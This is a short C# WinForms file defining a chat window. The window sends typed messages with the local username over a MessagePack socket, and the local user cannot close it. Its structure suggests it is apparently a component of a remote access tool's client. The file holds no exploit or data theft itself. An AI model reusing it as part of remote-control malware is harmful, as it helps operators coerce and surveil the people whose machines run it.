using Client.Handle_Packet;
using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Client.Helper
{
    public partial class FormChat : Form
    {
        public FormChat()
        {
            InitializeComponent();
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                richTextBox1.AppendText("Me: " + textBox1.Text + Environment.NewLine);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "chat";
                msgpack.ForcePathObject("WriteInput").AsString = Environment.UserName + ": " + textBox1.Text + Environment.NewLine;
                ClientSocket.Send(msgpack.Encode2Bytes());
                textBox1.Clear();
            }
        }

        private void FormChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
                if (!ClientSocket.IsConnected) Packet.GetFormChat.Dispose();
        }
    }
}
